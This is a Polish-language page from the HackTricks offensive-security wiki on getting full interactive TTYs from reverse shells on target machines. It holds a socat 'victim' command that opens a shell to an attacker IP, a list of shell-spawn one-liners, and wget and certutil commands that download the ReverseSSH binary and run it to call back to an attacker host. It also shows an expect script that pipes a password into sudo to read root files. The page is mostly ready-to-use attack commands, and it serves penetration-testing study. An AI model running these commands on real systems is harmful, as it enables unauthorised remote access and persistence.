# Pełne TTY

{{#include ../../banners/hacktricks-training.md}}

## Pełne TTY

`/etc/shells` zawiera ścieżki nazw poprawnych powłok logowania i jest wykorzystywany przez niektóre programy; nie jest uniwersalnym warunkiem wstępnym przydzielenia PTY.<sup>[[3]](#references)[[4]](#references)</sup> Jeśli program taki jak `pkexec` odrzuca zmienną `SHELL` z komunikatem `The value for the SHELL variable was not found in the /etc/shells file`, upewnij się, że dokładna ścieżka powłoki (na przykład `/bin/bash`) znajduje się w pliku `/etc/shells`.<sup>[[10]](#references)</sup> Poniższa sekwencja odzyskiwania `CTRL+Z`/`fg` korzysta z kontroli zadań Bash; jeśli bieżąca powłoka nie jest Bashem, uruchom Bash przed użyciem tej sekwencji.<sup>[[7]](#references)</sup>

#### Python

`pty.spawn` w Pythonie uruchamia program podłączony do standardowych strumieni wejścia, wyjścia i błędów bieżącego procesu, co zapewnia Bashowi pseudo-terminal w tej sesji.<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> Możesz uzyskać **liczbę** **wierszy** i **kolumn**, uruchamiając **`stty -a`**; `-a` wyświetla wszystkie bieżące ustawienia terminala. Dane wyjściowe polecenia są zależne od terminala, dlatego użyj wartości zgłoszonych przez bieżącą sesję.<sup>[[11]](#references)</sup>

#### script

Narzędzie `script` rejestruje sesję terminala; tutaj `/dev/null` odrzuca typescript, `-q` wycisza komunikaty o rozpoczęciu i zakończeniu, a `-c` uruchamia Bash zamiast domyślnej powłoki.<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
Po zastosowaniu dowolnej metody PTY-spawn zawieś sesję Netcat i przywróć ją z lokalnym trybem raw, a następnie ustaw zdalne środowisko terminala i jego wymiary:
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

Listener używa bieżącego terminala w trybie raw z wyłączonym lokalnym echem i akceptuje połączenia TCP na porcie 4444. Polecenie ofiary przydziela pty, łączy stderr, tworzy sesję, przekazuje SIGINT i stosuje rozsądne ustawienia terminala; dodaj `ctty`, jeśli proces potomny potrzebuje terminala sterującego.<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (stare wersje z `--interactive`): `!sh`

Wyjście Nmap jest zależne od wersji: w nowszych wydaniach Nmap usunięto tryb `--interactive`, więc `!sh` działa tylko w starych wersjach.<sup>[[13]](#references)</sup>

## ReverseSSH

Wygodnym sposobem na **interaktywny dostęp do shell**, a także **transfer plików** i **port forwarding**, jest umieszczenie statycznie linkowanego serwera ssh [ReverseSSH](https://github.com/Fahrj/reverse-ssh) na celu.<sup>[[1]](#references)</sup>

Poniżej znajduje się przykład dla `x86` z opublikowaną przez projekt binarką skompresowaną za pomocą UPX. W przypadku innych architektur lub artefaktów wydań użyj [strony wydań](https://github.com/Fahrj/reverse-ssh/releases/latest/) jako punktu nawigacyjnego.<sup>[[1]](#references)</sup>

1. Przygotuj lokalny host do przechwycenia przychodzącego połączenia SSH. W trybie nasłuchiwania `-l` włącza listener, a `-p 4444` wybiera port, na którym akceptuje połączenie celu.<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Cel Linux. Przenieś ten sam artefakt `upx_reverse-sshx86` do `/dev/shm/reverse-ssh` i nadaj mu uprawnienia wykonywania. Parametr `-p 4444` celu wybiera port nasłuchiwania powyżej, a `kali@10.0.0.2` określa konto i host używane do połączenia zwrotnego.<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Cel Windows. Full interactive PowerShell wymaga Windows 10 build 17763; zobacz [README projektu](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
Przykład dla Windows używa `certutil` z opcjami `-f -urlcache`; Microsoft opisuje `-f` jako wymuszenie pobrania URL i zaznacza, że dostępne parametry różnią się w zależności od wersji, dlatego jeśli ta forma jest niedostępna, sprawdź `certutil -?`.<sup>[[12]](#references)</sup>

- Po pomyślnym nawiązaniu połączenia zwrotnego listener ReverseSSH w trybie reverse domyślnie nasłuchuje na porcie `8888` (lub na wartości podanej za pomocą `-b`), a połączenia przychodzące akceptują dowolną nazwę użytkownika z domyślnym hasłem `letmeinbrudipls`. Zdalna powłoka działa z uprawnieniami konta, które uruchomiło `reverse-ssh(.exe)`.<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) automatycznie podnosi poziom Unix-like reverse shells do PTY, zmienia rozmiar Unix-like terminali i rejestruje interakcje z shellem; w przypadku Windows shells udostępnia readline, ale nie zapewnia zmiany rozmiaru terminala w czasie rzeczywistym.<sup>[[2]](#references)</sup>

![Interfejs handlera Penelope reverse shell](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

Uruchom `penelope`, aby domyślnie nasłuchiwać na `0.0.0.0:4444`; przychodzące Unix-like shells mogą być wtedy automatycznie ulepszane i rejestrowane.<sup>[[2]](#references)</sup>

![Obsługa i ulepszanie przychodzącego shella przez Penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

Jeśli z jakiegoś powodu nie możesz uzyskać pełnego TTY, **nadal możesz wchodzić w interakcję z programami**, które oczekują danych wejściowych użytkownika. W poniższym przykładzie Expect uruchamia `sudo`, czeka na prompt hasła, wysyła hasło i zwraca kontrolę za pomocą `interact`; `sudo -S` odczytuje hasło ze standardowego wejścia. Używaj tego wyłącznie w autoryzowanym labie i unikaj umieszczania prawdziwych danych uwierzytelniających w historii shella lub plikach źródłowych.<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - Statycznie linkowany serwer ssh z funkcją reverse shell dla CTF i podobnych zastosowań](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Handler shell, który automatyzuje kilka czynności, aby ułatwić pracę](https://github.com/brightio/penelope)
- [3] [shells(5) — strona podręcznika Linux](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — dokumentacja Python](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — strona podręcznika Linux](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — strona podręcznika Linux](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Podręcznik referencyjny Bash — kontrola zadań](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — strona podręcznika Linux](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — strona podręcznika Linux](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Dziennik zmian Nmap](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
